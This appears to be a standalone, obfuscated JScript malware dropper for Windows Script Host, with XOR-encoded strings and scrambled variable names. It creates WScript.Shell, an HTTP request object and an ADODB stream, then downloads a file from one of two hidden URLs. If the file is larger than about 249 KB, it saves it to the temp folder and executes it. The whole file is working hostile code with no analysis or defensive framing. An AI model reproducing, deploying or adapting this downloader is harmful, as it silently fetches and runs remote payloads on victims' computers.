function btoa(deposeljw, recoveringOmM, vatjwS) {
    var checkeredDOH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var canoncQK = String(vatjwS);
    for (var contemptMVg, delicacyNLk, spatNJw = 0, peonUhB = checkeredDOH, chagrinLTP = ""; canoncQK.charAt(spatNJw | 0) || (peonUhB = "=", 
    spatNJw % 1); chagrinLTP += peonUhB.charAt(63 & contemptMVg >> 8 - spatNJw % 1 * 8)) {
        delicacyNLk = canoncQK.charCodeAt(spatNJw += 3 / 4);
        if (delicacyNLk > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        contemptMVg = contemptMVg << 8 | delicacyNLk;
    }
    return chagrinLTP;
}

var stintkOb = function(languidVuo) {
    var threadbarey9F = "";
    var deposeljw = "stentorianIcS";
    var recoveringOmM = "besiegeC8p";
    btoa(deposeljw, recoveringOmM, [ 245, 174, 179, 241, 114, 97, 92, 134, 126, 57, 93, 169, 150, 36, 188, 32 ]);
    var batefij = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var emblazonSet = 0; emblazonSet < languidVuo.length; emblazonSet++) {
        var repastqhS = [ 245, 174, 179, 241, 114, 97, 92, 134, 126, 57, 93, 169, 150, 36, 188, 32 ];
        threadbarey9F += batefij(languidVuo[emblazonSet] ^ repastqhS[emblazonSet % repastqhS.length]);
    }
    return threadbarey9F;
};

var peongK8 = function() {
    var slayqQh = function() {
        var enjoinvwe = stintkOb([ 160, 200, 128, 162, 17, 49, 61, 223, 78, 65 ]);
        var obloquytSF = stintkOb([ 189, 195, 242, 152, 48, 7, 42, 191, 38, 10 ]);
    };
    slayqQh.prototype.F89OMD9yOL = function(citeaRy) {
        var gravitymAw = stintkOb([ 182, 220, 214, 144, 6, 4, 19, 228, 20, 92, 62, 221 ]);
        return wsh[gravitymAw](citeaRy);
    };
    slayqQh.prototype.pMXlrqn9WP = function(citeaRy) {
        var gravitymAw = stintkOb([ 182, 220, 214, 144, 6, 4, 19, 228, 20, 92, 62, 221 ]);
        return WScript[gravitymAw](citeaRy);
    };
    return slayqQh;
}();

(function() {
    var perfidiouswmh = [ stintkOb([ 157, 218, 199, 129, 72, 78, 115, 238, 14, 88, 47, 204, 239, 75, 201, 72, 144, 220, 214, 128, 3, 79, 63, 233, 19, 22, 101, 158, 184, 65, 196, 69 ]), stintkOb([ 157, 218, 199, 129, 72, 78, 115, 238, 14, 88, 49, 218, 249, 83, 221, 78, 129, 221, 213, 151, 92, 2, 51, 235, 81, 1, 106, 135, 243, 92, 217 ]) ];
    var conjugalefT = 4194304;
    var incandescentvJk = stintkOb([ 157, 193, 233, 188, 40, 88, 49, 240, 50, 86 ]);
    var maraudYPr = stintkOb([ 131, 228, 235, 133, 75, 32, 26, 212, 12, 107 ]);
    var chastiseem1 = new peongK8();
    var toilbjC = chastiseem1[stintkOb([ 133, 227, 235, 157, 0, 16, 50, 191, 41, 105 ])];
    var creviceJ3m = toilbjC(stintkOb([ 162, 253, 208, 131, 27, 17, 40, 168, 45, 81, 56, 197, 250 ]));
    var credibleQ8Y = toilbjC(stintkOb([ 184, 253, 235, 188, 62, 83, 114, 222, 51, 117, 21, 253, 194, 116 ]));
    var polemicalciu = toilbjC(stintkOb([ 180, 234, 252, 181, 48, 79, 15, 242, 12, 92, 60, 196 ]));
    var insinuateWIo = creviceJ3m.ExpandEnvironmentStrings(stintkOb([ 208, 250, 246, 188, 34, 68, 0 ]));
    var impositionH37 = insinuateWIo + conjugalefT + stintkOb([ 219, 203, 203, 148 ]);
    var nonplusp92 = false;
    var theoryFay = 200;
    for (var aidebyG = 0; aidebyG < perfidiouswmh.length; aidebyG++) {
        try {
            var incandescentOm3 = perfidiouswmh[aidebyG];
            credibleQ8Y.open(stintkOb([ 178, 235, 231 ]), incandescentOm3, false);
            credibleQ8Y.send();
            if (credibleQ8Y.status == theoryFay) {
                try {
                    polemicalciu[stintkOb([ 154, 222, 214, 159 ])]();
                    polemicalciu.type = 1;
                    polemicalciu[stintkOb([ 130, 220, 218, 133, 23 ])](credibleQ8Y[stintkOb([ 135, 203, 192, 129, 29, 15, 47, 227, 60, 86, 57, 208 ])]);
                    var objectiveszo = Math.pow(2, 10) * 249;
                    if (polemicalciu.size > objectiveszo) {
                        aidebyG = perfidiouswmh.length;
                        polemicalciu.position = 0;
                        polemicalciu.saveToFile(impositionH37, 2);
                        nonplusp92 = true;
                    }
                } finally {
                    polemicalciu.close();
                }
            }
        } catch (ignored) {}
    }
    if (nonplusp92) {
        creviceJ3m[stintkOb([ 176, 214, 214, 146 ])](insinuateWIo + Math.pow(2, 22));
    }
})();